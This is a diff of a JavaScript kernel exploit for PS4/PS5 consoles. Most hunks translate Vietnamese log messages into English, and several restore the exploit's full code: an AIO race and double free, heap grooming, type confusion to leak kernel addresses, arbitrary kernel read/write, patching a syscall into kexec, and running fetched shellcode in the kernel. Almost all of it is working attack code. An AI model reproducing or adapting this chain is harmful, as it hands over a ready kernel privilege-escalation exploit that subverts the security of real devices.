@@ -67,7 +67,7 @@ const [is_ps4, version] = (() => {
     throw RangeError(`invalid config.target: ${hex(value)}`);
   }
 
-  log(`Hệ Máy: PS${is_ps4 ? "4" : "5"} | Phiên Bản: ${hex(version)}`);
+  log(`console: PS${is_ps4 ? "4" : "5"} | firmware: ${hex(version)}`);
 
   return [is_ps4, version];
 })();
@@ -541,9 +541,9 @@ function make_aliased_rthdrs(sds) {
       get_rthdr(sds[i], buf);
       const marker = buf.read32(marker_offset);
       if (marker !== i) {
-        log(`đã tạo bí danh rthdrs tại lần thử: ${loop}`);
+        log(`aliased rthdrs at attempt: ${loop}`);
         const pair = [sds[i], sds[marker]];
-        log(`đã tìm thấy cặp: ${pair}`);
+        log(`found pair: ${pair}`);
         sds.splice(marker, 1);
         sds.splice(i, 1);
         free_rthdrs(sds);
@@ -650,7 +650,7 @@ function race_one(request_addr, tcp_sd, barrier, racer, sds) {
   chain.reset();
 
   const main_res = chain.retval_int;
-  log(`tạm dừng ${thr_tid}: ${main_res} mã lỗi: ${chain.errno}`);
+  log(`suspend ${thr_tid}: ${main_res} errno: ${chain.errno}`);
 
   if (main_res === -1) {
     call_nze("pthread_join", pthr, 0);
@@ -662,11 +662,11 @@ function race_one(request_addr, tcp_sd, barrier, racer, sds) {
   try {
     const poll_err = new View4(1);
     aio_multi_poll(request_addr, 1, poll_err.addr);
-    log(`thăm dò: ${hex(poll_err[0])}`);
+    log(`poll: ${hex(poll_err[0])}`);
 
     const info_buf = new View1(sizeof_tcp_info_);
     const info_size = gsockopt(tcp_sd, IPPROTO_TCP, TCP_INFO, info_buf);
-    log(`kích thước thông tin: ${hex(info_size)}`);
+    log(`info size: ${hex(info_size)}`);
 
     if (info_size !== sizeof_tcp_info_) {
       die(`info size isn't ${sizeof_tcp_info_}: ${info_size}`);
@@ -683,17 +683,17 @@ function race_one(request_addr, tcp_sd, barrier, racer, sds) {
       won_race = true;
     }
   } finally {
-    log("tiếp tục luồng\n");
+    log("resume thread\n");
     sysi("thr_resume_ucontext", thr_tid);
     call_nze("pthread_join", pthr, 0);
   }
 
   if (won_race) {
-    log(`lỗi tranh chấp: ${hex(sce_errs[0])}, ${hex(sce_errs[1])}`);
+    log(`race errors: ${hex(sce_errs[0])}, ${hex(sce_errs[1])}`);
     // if the code has no bugs then this isn't possible but we keep the
     // check for easier debugging
     if (sce_errs[0] !== sce_errs[1]) {
-      log("LỖI: won_race không hợp lệ");
+      log("ERROR: bad won_race");
       die("ERROR: bad won_race");
     }
     // RESTORE: double freed memory has been reclaimed with harmless data
@@ -774,7 +774,7 @@ function double_free_reqs2(sds) {
     close(sd_conn);
 
     if (res !== null) {
-      log(`thắng race tại lần thử: ${i}`);
+      log(`won race at attempt: ${i}`);
       close(sd_listen);
       call_nze("pthread_barrier_destroy", barrier.addr);
       return res;
@@ -860,7 +860,7 @@ function leak_kernel_addrs(sd_pair) {
 
   // type confuse a struct evf with a struct ip6_rthdr. the flags of the evf
   // must be set to >= 0xf00 in order to fully leak the contents of the rthdr
-  log("nhầm lẫn evf với rthdr");
+  log("confuse evf with rthdr");
   let evf = null;
   for (let i = 0; i < num_alias; i++) {
     const evfs = [];
@@ -887,7 +887,7 @@ function leak_kernel_addrs(sd_pair) {
     }
 
     if (evf !== null) {
-      log(`đã nhầm lẫn rthdr và evf tại lần thử: ${i}`);
+      log(`confused rthdr and evf at attempt: ${i}`);
       break;
     }
   }
@@ -908,14 +908,14 @@ function leak_kernel_addrs(sd_pair) {
   // evf.cv.cv_description = "evf cv"
   // string is located at the kernel's mapped ELF file
   const kernel_addr = buf.read64(0x28);
-  log(`địa chỉ chuỗi "evf cv": ${kernel_addr}`);
+  log(`"evf cv" string addr: ${kernel_addr}`);
   // because of TAILQ_INIT(), we have:
   //
   // evf.waiters.tqh_last == &evf.waiters.tqh_first
   //
   // we now know the address of the kernel buffer we are leaking
   const kbuf_addr = buf.read64(0x40).sub(0x38);
-  log(`địa chỉ bộ đệm kernel: ${kbuf_addr}`);
+  log(`kernel buffer addr: ${kbuf_addr}`);
 
   // 0x80 < num_elems * sizeof(SceKernelAioRWRequest) <= 0x100
   // allocate reqs1 arrays at 0x100 malloc zone
@@ -933,7 +933,7 @@ function leak_kernel_addrs(sd_pair) {
   const leak_ids = new View4(leak_ids_len);
   const leak_ids_p = leak_ids.addr;
 
-  log("tìm aio_entry");
+  log("find aio_entry");
   let reqs2_off = null;
   loop: for (let i = 0; i < num_leaks; i++) {
     get_rthdr(sd, buf);
@@ -944,7 +944,7 @@ function leak_kernel_addrs(sd_pair) {
     for (let off = 0x80; off < buf.length; off += 0x80) {
       if (verify_reqs2(buf, off)) {
         reqs2_off = off;
-        log(`đã tìm thấy reqs2 tại lần thử: ${i}`);
+        log(`found reqs2 at attempt: ${i}`);
         break loop;
       }
     }
@@ -954,19 +954,19 @@ function leak_kernel_addrs(sd_pair) {
   if (reqs2_off === null) {
     die("could not leak a reqs2");
   }
-  log(`độ lệch reqs2: ${hex(reqs2_off)}`);
+  log(`reqs2 offset: ${hex(reqs2_off)}`);
 
   get_rthdr(sd, buf);
   const reqs2 = buf.slice(reqs2_off, reqs2_off + 0x80);
-  log("aio_entry bị rò rỉ:");
+  log("leaked aio_entry:");
   hexdump(reqs2);
 
   const reqs1_addr = new Long(reqs2.read64(0x10));
-  log(`địa chỉ reqs1: ${reqs1_addr}`);
+  log(`reqs1_addr: ${reqs1_addr}`);
   reqs1_addr.lo &= -0x100;
-  log(`địa chỉ reqs1: ${reqs1_addr}`);
+  log(`reqs1_addr: ${reqs1_addr}`);
 
-  log("đang tìm target_id");
+  log("searching target_id");
   let target_id = null;
   let to_cancel_p = null;
   let to_cancel_len = null;
@@ -976,14 +976,14 @@ function leak_kernel_addrs(sd_pair) {
     get_rthdr(sd, buf);
     const state = buf.read32(reqs2_off + 0x38);
     if (state === AIO_STATE_ABORTED) {
-      log(`đã tìm thấy target_id tại batch: ${i / num_elems}`);
+      log(`found target_id at batch: ${i / num_elems}`);
 
       target_id = new Word(leak_ids[i]);
       leak_ids[i] = 0;
       log(`target_id: ${hex(target_id)}`);
 
       const reqs2 = buf.slice(reqs2_off, reqs2_off + 0x80);
-      log("aio_entry bị rò rỉ:");
+      log("leaked aio_entry:");
       hexdump(reqs2);
 
       const start = i + num_elems;
@@ -993,7 +993,7 @@ function leak_kernel_addrs(sd_pair) {
     }
   }
   if (target_id === null) {
-    die("không tìm thấy target_id");
+    die("target_id not found");
   }
 
   cancel_aios(to_cancel_p, to_cancel_len);
@@ -1020,11 +1020,13 @@ function make_aliased_pktopts(sds) {
       gsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
       const marker = tclass[0];
       if (marker !== i) {
-        log(`đã alias pktopts tại lần thử: ${loop}`);
+        log(`aliased pktopts at attempt: ${loop}`);
         const pair = [sds[i], sds[marker]];
-        log(`đã tìm thấy cặp: ${pair}`);
+        log(`found pair: ${pair}`);
         sds.splice(marker, 1);
         sds.splice(i, 1);
+        // add pktopts to the new sockets now while new allocs can't
+        // use the double freed memory
         for (let i = 0; i < 2; i++) {
           const sd = new_socket();
           ssockopt(sd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
@@ -1035,50 +1037,168 @@ function make_aliased_pktopts(sds) {
       }
     }
   }
-  die("không thể tạo pktopts bị alias");
+  die("failed to make aliased pktopts");
 }
 
 function double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd, sds) {
-  ...
-  log("bắt đầu vòng lặp ghi đè rthdr bằng mục hàng đợi AIO");
-  ...
-      log(`đã alias tại lần thử: ${i}`);
-  ...
+  const max_leak_len = (0xff + 1) << 3;
+  const buf = new Buffer(max_leak_len);
+
+  const num_elems = max_aio_ids;
+  const aio_reqs = make_reqs1(num_elems);
+  const aio_reqs_p = aio_reqs.addr;
+
+  const num_batches = 2;
+  const aio_ids_len = num_batches * num_elems;
+  const aio_ids = new View4(aio_ids_len);
+  const aio_ids_p = aio_ids.addr;
+
+  log("start overwrite rthdr with AIO queue entry loop");
+  let aio_not_found = true;
+  free_evf(evf);
+  for (let i = 0; i < num_clobbers; i++) {
+    spray_aio(num_batches, aio_reqs_p, num_elems, aio_ids_p);
+
+    if (get_rthdr(sd, buf) === 8 && buf.read32(0) === AIO_CMD_READ) {
+      log(`aliased at attempt: ${i}`);
+      aio_not_found = false;
+      cancel_aios(aio_ids_p, aio_ids_len);
+      break;
+    }
+
+    free_aios(aio_ids_p, aio_ids_len);
+  }
   if (aio_not_found) {
-    die("không thể ghi đè rthdr");
+    die("failed to overwrite rthdr");
   }
-  ...
-  log("bắt đầu vòng lặp ghi đè mục hàng đợi AIO bằng rthdr");
-  ...
+
+  const reqs2 = new Buffer(0x80);
+  const rsize = build_rthdr(reqs2, reqs2.size);
+  // .ar2_ticket
+  reqs2.write32(4, 5);
+  // .ar2_info
+  reqs2.write64(0x18, reqs1_addr);
+  // craft a aio_batch using the end portion of the buffer
+  const reqs3_off = 0x28;
+  // .ar2_batch
+  reqs2.write64(0x20, kbuf_addr.add(reqs3_off));
+
+  // [.ar3_num_reqs, .ar3_reqs_left] aliases .ar2_spinfo
+  // safe since free_queue_entry() doesn't deref the pointer
+  reqs2.write32(reqs3_off, 1);
+  reqs2.write32(reqs3_off + 4, 0);
+  // [.ar3_state, .ar3_done] aliases .ar2_result.returnValue
+  reqs2.write32(reqs3_off + 8, AIO_STATE_COMPLETE);
+  reqs2[reqs3_off + 0xc] = 0;
+  // .ar3_lock aliases .ar2_qentry (rest of the buffer is padding)
+  // safe since the entry already got dequeued
+  //
+  // .ar3_lock.lock_object.lo_flags = (
+  //     LO_SLEEPABLE | LO_UPGRADABLE
+  //     | LO_RECURSABLE | LO_DUPOK | LO_WITNESS
+  //     | 6 << LO_CLASSSHIFT
+  //     | LO_INITIALIZED
+  // )
+  reqs2.write32(reqs3_off + 0x28, 0x67b0000);
+  // .ar3_lock.lk_lock = LK_UNLOCKED
+  reqs2.write64(reqs3_off + 0x38, 1);
+
+  const states = new View4(num_elems);
+  const states_p = states.addr;
+  const addr_cache = [aio_ids_p];
+  for (let i = 1; i < num_batches; i++) {
+    addr_cache.push(aio_ids_p.add((i * num_elems) << 2));
+  }
+
+  log("start overwrite AIO queue entry with rthdr loop");
+  let req_id = null;
+  close(sd);
+  sd = null;
+  loop: for (let i = 0; i < num_alias; i++) {
+    for (const sd of sds) {
+      set_rthdr(sd, reqs2, rsize);
+    }
+
+    for (let batch = 0; batch < addr_cache.length; batch++) {
+      states.fill(-1);
+      aio_multi_cancel(addr_cache[batch], num_elems, states_p);
+
+      const req_idx = states.indexOf(AIO_STATE_COMPLETE);
+      if (req_idx !== -1) {
         log(`req_idx: ${req_idx}`);
-        log(`đã tìm thấy req_id tại batch: ${batch}`);
-        log(`trạng thái: ${[...states].map((e) => hex(e))}`);
+        log(`found req_id at batch: ${batch}`);
+        log(`states: ${[...states].map((e) => hex(e))}`);
         log(`states[${req_idx}]: ${hex(states[req_idx])}`);
-        log(`đã alias tại lần thử: ${i}`);
-        ...
+        log(`aliased at attempt: ${i}`);
+
+        const aio_idx = batch * num_elems + req_idx;
+        req_id = new Word(aio_ids[aio_idx]);
         log(`req_id: ${hex(req_id)}`);
-        ...
+        aio_ids[aio_idx] = 0;
+
+        // set .ar3_done to 1
+        poll_aio(req_id, states);
         log(`states[${req_idx}]: ${hex(states[0])}`);
-        ...
-            die("không tìm thấy sd đã ghi đè mục hàng đợi AIO");
+        for (let i = 0; i < num_sds; i++) {
+          const sd2 = sds[i];
+          get_rthdr(sd2, reqs2);
+          const done = reqs2[reqs3_off + 0xc];
+          if (done) {
+            hexdump(reqs2);
+            sd = sd2;
+            sds.splice(i, 1);
+            free_rthdrs(sds);
+            sds.push(new_socket());
+            break;
+          }
+        }
+        if (sd === null) {
+          die("can't find sd that overwrote AIO queue entry");
+        }
         log(`sd: ${sd}`);
-  ...
-  if (req_id === null) {
-    die("không thể ghi đè mục hàng đợi AIO");
+
+        break loop;
+      }
+    }
   }
-  ...
-  log(`trạng thái của target: ${hex(states[0])}`);
-  ...
-    log(`lỗi xóa: ${hex(sce_errs[0])}, ${hex(sce_errs[1])}`);
-    ...
-    log(`trạng thái target: ${hex(states[0])}, ${hex(states[1])}`);
-    ...
+  if (req_id === null) {
+    die("failed to overwrite AIO queue entry");
+  }
+  free_aios2(aio_ids_p, aio_ids_len);
+
+  // enable deletion of target_id
+  poll_aio(target_id, states);
+  log(`target's state: ${hex(states[0])}`);
+
+  const sce_errs = new View4([-1, -1]);
+  const target_ids = new View4([req_id, target_id]);
+  // PANIC: double free on the 0x100 malloc zone. important kernel data may
+  // alias
+  aio_multi_delete(target_ids.addr, 2, sce_errs.addr);
+
+  // we reclaim first since the sanity checking here is longer which makes it
+  // more likely that we have another process claim the memory
+  try {
+    // RESTORE: double freed memory has been reclaimed with harmless data
+    // PANIC: 0x100 malloc zone pointers aliased
+    const sd_pair = make_aliased_pktopts(sds);
+    return [sd_pair, sd];
+  } finally {
+    log(`delete errors: ${hex(sce_errs[0])}, ${hex(sce_errs[1])}`);
+
+    states[0] = -1;
+    states[1] = -1;
+    poll_aio(target_ids, states);
+    log(`target states: ${hex(states[0])}, ${hex(states[1])}`);
+
+    const SCE_KERNEL_ERROR_ESRCH = 0x80020003;
+    let success = true;
     if (states[0] !== SCE_KERNEL_ERROR_ESRCH) {
-      log("LỖI: xóa sai yêu cầu AIO bị lỗi");
+      log("ERROR: bad delete of corrupt AIO request");
       success = false;
     }
     if (sce_errs[0] !== 0 || sce_errs[0] !== sce_errs[1]) {
-      log("LỖI: xóa cặp ID không hợp lệ");
+      log("ERROR: bad delete of ID pair");
       success = false;
     }
 
@@ -1119,7 +1239,7 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     gsockopt(psd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
     const marker = tclass[0];
     if ((marker & 0xffff) === 0x4141) {
-      log(`đã tìm thấy reclaim sd tại lần thử: ${i}`);
+      log(`found reclaim sd at attempt: ${i}`);
       const idx = marker >>> 16;
       reclaim_sd = sds[idx];
       sds.splice(idx, 1);
@@ -1127,28 +1247,55 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     }
   }
   if (reclaim_sd === null) {
-    die("không thể ghi đè pktopts chính");
+    die("failed to overwrite main pktopts");
   }
 
-  ...
+  const pktinfo = new Buffer(0x14);
+  pktinfo.write64(0, pktinfo_p);
+  const nhop = new Word();
+  const nhop_p = nhop.addr;
+  const read_buf = new Buffer(8);
+  const read_buf_p = read_buf.addr;
+  function kread64(addr) {
+    const len = 8;
+    let offset = 0;
+    while (offset < len) {
+      // pktopts.ip6po_nhinfo = addr + offset
+      pktinfo.write64(8, addr.add(offset));
+      nhop[0] = len - offset;
+
+      ssockopt(psd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
+      sysi("getsockopt", psd, IPPROTO_IPV6, IPV6_NEXTHOP, read_buf_p.add(offset), nhop_p);
+
+      const n = nhop[0];
+      if (n === 0) {
+        read_buf[offset] = 0;
+        offset += 1;
+      } else {
+        offset += n;
+      }
+    }
+    return read_buf.read64(0);
+  }
 
   log(`kread64(&"evf cv"): ${kread64(kernel_addr)}`);
   const kstr = jstr(read_buf);
   log(`*(&"evf cv"): ${kstr}`);
   if (kstr !== "evf cv") {
-    die('kiểm tra đọc &"evf cv" thất bại');
+    die('test read of &"evf cv" failed');
   }
 
   const kbase = kernel_addr.sub(off_kstr);
-  log(`địa chỉ nền kernel: ${kbase}`);
+  log(`kernel base: ${kbase}`);
 
-  log("\nđang tạo đọc/ghi kernel tùy ý");
+  log("\nmaking arbitrary kernel read/write");
   const cpuid = 7 - main_core;
   const pcpu_p = kbase.add(off_cpuid_to_pcpu + cpuid * 8);
   log(`cpuid_to_pcpu[${cpuid}]: ${pcpu_p}`);
   const pcpu = kread64(pcpu_p);
   log(`pcpu: ${pcpu}`);
   log(`cpuid: ${kread64(pcpu.add(0x30)).hi}`);
+  // __pcpu[cpuid].pc_curthread
   const td = kread64(pcpu);
   log(`td: ${td}`);
 
@@ -1156,11 +1303,11 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
   const proc = kread64(td.add(off_td_proc));
   log(`proc: ${proc}`);
   const pid = sysi("getpid");
-  log(`pid của chúng ta: ${pid}`);
+  log(`our pid: ${pid}`);
   const pid2 = kread64(proc.add(0xb0)).lo;
-  log(`pid tiến trình nghi vấn: ${pid2}`);
+  log(`suspected proc pid: ${pid2}`);
   if (pid2 !== pid) {
-    die("không tìm thấy tiến trình");
+    die("process not found");
   }
 
   const off_p_fd = 0x48;
@@ -1172,15 +1319,15 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
 
   const off_p_ucred = 0x40;
   const p_ucred = kread64(proc.add(off_p_ucred));
-  log(`p_ucred: ${p_ucred}`);
+  log(`p_ucred ${p_ucred}`);
 
   const pipes = new View4(2);
   sysi("pipe", pipes.addr);
   const pipe_file = kread64(ofiles.add(pipes[0] * 8));
-  log(`file pipe: ${pipe_file}`);
+  log(`pipe file: ${pipe_file}`);
   // ofiles[pipe_fd].f_data
   const kpipe = kread64(pipe_file);
-  log(`con trỏ pipe: ${kpipe}`);
+  log(`pipe pointer: ${kpipe}`);
 
   const pipe_save = new Buffer(0x18); // sizeof struct pipebuf
   for (let off = 0; off < pipe_save.size; off += 8) {
@@ -1191,47 +1338,47 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
   const worker_sd = dirty_sd;
 
   const main_file = kread64(ofiles.add(main_sd * 8));
-  log(`file socket chính: ${main_file}`);
+  log(`main sock file: ${main_file}`);
   // ofiles[sd].f_data
   const main_sock = kread64(main_file);
-  log(`con trỏ socket chính: ${main_sock}`);
+  log(`main sock pointer: ${main_sock}`);
   // socket.so_pcb (struct inpcb *)
   const m_pcb = kread64(main_sock.add(0x18));
-  log(`pcb socket chính: ${m_pcb}`);
+  log(`main sock pcb: ${m_pcb}`);
   // inpcb.in6p_outputopts
   const m_pktopts = kread64(m_pcb.add(0x118));
-  log(`pktopts chính: ${m_pktopts}`);
-  log(`con trỏ malloc zone 0x100: ${k100_addr}`);
+  log(`main pktopts: ${m_pktopts}`);
+  log(`0x100 malloc zone pointer: ${k100_addr}`);
 
   if (m_pktopts.ne(k100_addr)) {
-    die("con trỏ pktopts chính khác con trỏ pktopts bị leak");
+    die("main pktopts pointer != leaked pktopts pointer");
   }
 
   // ofiles[sd].f_data
   const reclaim_sock = kread64(kread64(ofiles.add(reclaim_sd * 8)));
-  log(`con trỏ socket reclaim: ${reclaim_sock}`);
+  log(`reclaim sock pointer: ${reclaim_sock}`);
   // socket.so_pcb (struct inpcb *)
   const r_pcb = kread64(reclaim_sock.add(0x18));
-  log(`pcb socket reclaim: ${r_pcb}`);
+  log(`reclaim sock pcb: ${r_pcb}`);
   // inpcb.in6p_outputopts
   const r_pktopts = kread64(r_pcb.add(0x118));
-  log(`pktopts reclaim: ${r_pktopts}`);
+  log(`reclaim pktopts: ${r_pktopts}`);
 
   // ofiles[sd].f_data
   const worker_sock = kread64(kread64(ofiles.add(worker_sd * 8)));
-  log(`con trỏ socket worker: ${worker_sock}`);
+  log(`worker sock pointer: ${worker_sock}`);
   // socket.so_pcb (struct inpcb *)
   const w_pcb = kread64(worker_sock.add(0x18));
-  log(`pcb socket worker: ${w_pcb}`);
+  log(`worker sock pcb: ${w_pcb}`);
   // inpcb.in6p_outputopts
   const w_pktopts = kread64(w_pcb.add(0x118));
-  log(`pktopts worker: ${w_pktopts}`);
+  log(`worker pktopts: ${w_pktopts}`);
 
-  // lấy quyền đọc/ghi kernel bị giới hạn bằng cặp pktopts
+  // get restricted read/write with pktopts pair
   // main_pktopts.ip6po_pktinfo = &worker_pktopts.ip6po_pktinfo
   const w_pktinfo = w_pktopts.add(0x10);
   pktinfo.write64(0, w_pktinfo);
-  pktinfo.write64(8, 0); // xóa .ip6po_nexthop
+  pktinfo.write64(8, 0); // clear .ip6po_nexthop
   ssockopt(main_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
 
   pktinfo.write64(0, kernel_addr);
@@ -1240,14 +1387,14 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
   const kstr2 = jstr(pktinfo);
   log(`*(&"evf cv"): ${kstr2}`);
   if (kstr2 !== "evf cv") {
-    die("đọc pktopts thất bại");
+    die("pktopts read failed");
   }
-  log("đã đạt được quyền đọc/ghi kernel bị giới hạn");
+  log("achieved restricted kernel read/write");
 
-  // in6_pktinfo.ipi6_ifindex phải bằng 0 (hoặc index interface hợp lệ) khi
-  // dùng pktopts write. ta có thể chỉnh sửa pipe an toàn trong giới hạn này,
-  // nên sẽ phá pipe để có quyền đọc/ghi tùy ý. pipe.pipe_map sẽ bị ghi đè
-  // thành 0 nhưng không sao
+  // in6_pktinfo.ipi6_ifindex must be 0 (or a valid interface index) when
+  // using pktopts write. we can safely modify a pipe even with this limit so
+  // we corrupt that instead for arbitrary read/write. pipe.pipe_map will be
+  // clobbered with zeros but that's okay
   class KernelMemory {
     constructor(main_sd, worker_sd, pipes, pipe_addr) {
       this.main_sd = main_sd;
@@ -1264,7 +1411,7 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
 
     _verify_len(len) {
       if (!(Number.isInteger(len) && 0 <= len <= 0xffffffff)) {
-        throw TypeError("độ dài không phải số nguyên không dấu 32-bit");
+        throw TypeError("len not a 32-bit unsigned integer");
       }
     }
 
@@ -1367,52 +1514,53 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
   const kstr3 = jstr(kstr3_buf);
   log(`*(&"evf cv"): ${kstr3}`);
   if (kstr3 !== "evf cv") {
-    die("đọc pipe thất bại");
+    die("pipe read failed");
   }
-  log("đã đạt được quyền đọc/ghi kernel tùy ý");
+  log("achieved arbitrary kernel read/write");
 
-  // KHÔI PHỤC: dọn dẹp các con trỏ bị lỗi
+  // RESTORE: clean corrupt pointers
   // pktopts.ip6po_rthdr = NULL
   const off_ip6po_rthdr = is_ps4 ? 0x68 : 0x70;
   const r_rthdr_p = r_pktopts.add(off_ip6po_rthdr);
   const w_rthdr_p = w_pktopts.add(off_ip6po_rthdr);
   kmem.write64(r_rthdr_p, 0);
   kmem.write64(w_rthdr_p, 0);
-  log("đã dọn dẹp các con trỏ bị hỏng");
+  log("corrupt pointers cleaned");
 
   return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
 }
 
-// CÁC HÀM CHO GIAI ĐOẠN: VÁ KERNEL
+// FUNCTIONS FOR STAGE: PATCH KERNEL
 
 async function get_binary(url) {
   const response = await fetch(url);
   if (!response.ok) {
-    throw Error(`phản hồi mạng không OK, mã trạng thái: ${response.status}\nkhông thể tải: ${url}`);
+    throw Error(`network response was not OK, status: ${response.status}\nfailed to fetch: ${url}`);
   }
   return response.arrayBuffer();
 }
 
-// Dùng JIT để nạp shellcode của chúng ta giúp tránh phải dùng thủ thuật
-// bật/tắt bit CR0.WP. Ta có thể bật/tắt trực tiếp trong shellcode.
+// Using JIT to load our own shellcode code here avoids the need to preform
+// some trick toggle the CR0.WP bit. We can just toggle it easily within our
+// shellcode.
 async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
   if (!is_ps4) {
-    throw RangeError("vá kernel PS5 chưa được hỗ trợ");
+    throw RangeError("ps5 kernel patching unsupported");
   }
   if (!(0x700 <= version && version < 0x1000)) {
-    // Chỉ hỗ trợ 7.00–9.60
-    throw RangeError("phiên bản kernel không được hỗ trợ");
+    // Only 7.00-9.60 supported
+    throw RangeError("kernel patching unsupported");
   }
 
-  log("đổi sys_aio_submit() thành sys_kexec()");
-  // sysent[661] chưa được triển khai nên có thể dùng
+  log("change sys_aio_submit() to sys_kexec()");
+  // sysent[661] is unimplemented so free for use
   const sysent_661 = kbase.add(off_sysent_661);
   const sysent_661_save = new Buffer(0x30); // sizeof syscall
   for (let off = 0; off < sysent_661_save.size; off += 8) {
     sysent_661_save.write64(off, kmem.read64(sysent_661.add(off)));
   }
-  log(`địa chỉ lưu sysent[611]: ${sysent_661_save.addr}`);
-  log("dữ liệu lưu sysent[611]:");
+  log(`sysent[611] save addr: ${sysent_661_save.addr}`);
+  log("sysent[611] save data:");
   hexdump(sysent_661_save);
   // .sy_narg = 6
   kmem.write32(sysent_661, 6);
@@ -1421,24 +1569,24 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
   // .sy_thrcnt = SY_THR_STATIC
   kmem.write32(sysent_661.add(0x2c), 1);
 
-  log("thiết lập các bit cho quyền JIT");
-  // TODO: chỉ cần bật các bit quyền JIT
+  log("set the bits for JIT privs");
+  // TODO: Just set the bits for JIT privs
   // cr_sceCaps[0] // 0x2000038000000000
   kmem.write64(p_ucred.add(0x60), -1); // 0xffffffffffffffff
   // cr_sceCaps[1] // 0x800000000000ff00
   kmem.write64(p_ucred.add(0x68), -1); // 0xffffffffffffffff
-  
+
   const buf = await get_binary(patch_elf_loc);
   const patches = new View1(buf);
   let map_size = patches.size;
   const max_size = 0x10000000;
   if (map_size > max_size) {
-    die(`file vá quá lớn (>${max_size}): ${map_size}`);
+    die(`patch file too large (>${max_size}): ${map_size}`);
   }
   if (map_size === 0) {
-    die("kích thước file vá bằng 0");
+    die("patch file size is zero");
   }
-  log(`kích thước kpatch: ${map_size} byte`);
+  log(`kpatch size: ${map_size} bytes`);
   map_size = (map_size + page_size) & -page_size;
 
   const prot_rw = 3;
@@ -1447,62 +1595,62 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
   const exec_p = new Int(0, 9);
   const write_p = new Int(max_size, 9);
 
-  log("mở các fd JIT");
+  log("open JIT fds");
   const exec_fd = sysi("jitshm_create", 0, map_size, prot_rwx);
   const write_fd = sysi("jitshm_alias", exec_fd, prot_rw);
 
-  log("mmap cho shellcode kpatch");
+  log("mmap for kpatch shellcode");
   const exec_addr = chain.sysp("mmap", exec_p, map_size, prot_rx, MAP_SHARED | MAP_FIXED, exec_fd, 0);
   const write_addr = chain.sysp("mmap", write_p, map_size, prot_rw, MAP_SHARED | MAP_FIXED, write_fd, 0);
 
   log(`exec_addr: ${exec_addr}`);
   log(`write_addr: ${write_addr}`);
   if (exec_addr.ne(exec_p) || write_addr.ne(write_p)) {
-    die("mmap() cho jit thất bại");
+    die("mmap() for jit failed");
   }
 
-  log("mlock exec_addr để kernel thực thi");
+  log("mlock exec_addr for kernel exec");
   sysi("mlock", exec_addr, map_size);
 
   // mov eax, 0x1337; ret (0xc300_0013_37b8)
   const test_code = new Int(0x001337b8, 0xc300);
   write_addr.write64(0, test_code);
 
-  log("kiểm tra thực thi jit");
+  log("test jit exec");
   sys_void("kexec", exec_addr);
   let retval = chain.errno;
-  log("trả về thành công");
+  log("returned successfully");
 
-  log(`giá trị trả về jit: ${retval}`);
+  log(`jit retval: ${retval}`);
   if (retval !== 0x1337) {
-    die("kiểm tra thực thi jit thất bại");
+    die("test jit exec failed");
   }
 
-  log("mlock dữ liệu đã lưu để khôi phục kernel");
+  log("mlock saved data for kernel restore");
   const pipe_save = restore_info[1];
   restore_info[1] = pipe_save.addr;
   sysi("mlock", restore_info[1], page_size);
   restore_info[4] = sysent_661_save.addr;
   sysi("mlock", restore_info[4], page_size);
 
-  log("thực thi kpatch...");
+  log("execute kpatch...");
   mem.cpy(write_addr, patches.addr, patches.size);
   sys_void("kexec", exec_addr, ...restore_info);
 
-  // Đóng toàn bộ một cách tường minh, thực tế có vẻ đã tự đóng rồi...
-  // không khắc phục được lỗi màn hình đen.
+  // Explicitly close everything, it should happen implicitly already... did
+  // not fix blackscreen issue.
 
-  // log("munlock dữ liệu đã khóa");
+  // log("munlock locked data");
   // sysi("munlock", restore_info[4], page_size);
   // sysi("munlock", restore_info[1], page_size);
   // sysi("munlock", exec_addr, map_size);
 
-  // log("munmap bộ nhớ shellcode kpatch");
+  // log("munmap kpatch shellcode memory");
   // sysi("munmap", write_addr, map_size);
   // sysi("munmap", exec_addr, map_size);
 
-  // Một cái thì chạy, cả hai gây lỗi OOM, sau đó chạy lại do kpatch đã thành công
-  // log("đóng các fd JIT");
+  // One works, both cause an OOM error, then works as it reloads because it kpatched properly
+  // log("close JIT fds");
   // close(write_fd);
   // close(exec_fd);
 }
@@ -1514,7 +1662,7 @@ function setup(block_fd) {
   // we may cancel them instead. this is to work around the fact that
   // aio_worker_entry2() will fdrop() the file associated with the aio_entry
   // on ps5. we want aio_multi_delete() to call fdrop()
-  log("chặn AIO");
+  log("block AIO");
   const reqs1 = new Buffer(0x28 * num_workers);
   const block_id = new Word();
 
@@ -1524,7 +1672,7 @@ function setup(block_fd) {
   }
   aio_submit_cmd(AIO_CMD_READ, reqs1.addr, num_workers, block_id.addr);
 
-  log("chuẩn bị heap (heap grooming)");
+  log("heap grooming");
   // chosen to maximize the number of 0x80 malloc allocs per submission
   const num_reqs = 3;
   const groom_ids = new View4(num_grooms);
@@ -1555,7 +1703,7 @@ export async function kexploit() {
   // If setuid is successful, we dont need to run the kernel exploit again
   try {
     if (sysi("setuid", 0) == 0) {
-      log("kernel đã được vá, bỏ qua kexploit");
+      log("kernel already patched, skipping kexploit");
       return true;
     }
   } catch {
@@ -1567,8 +1715,8 @@ export async function kexploit() {
   // Get current core/rtprio
   const current_core = get_current_core();
   const current_rtprio = get_current_rtprio();
-  log(`core hiện tại: ${current_core}`);
-  log(`rtprio hiện tại: type=${current_rtprio.type} prio=${current_rtprio.prio}`);
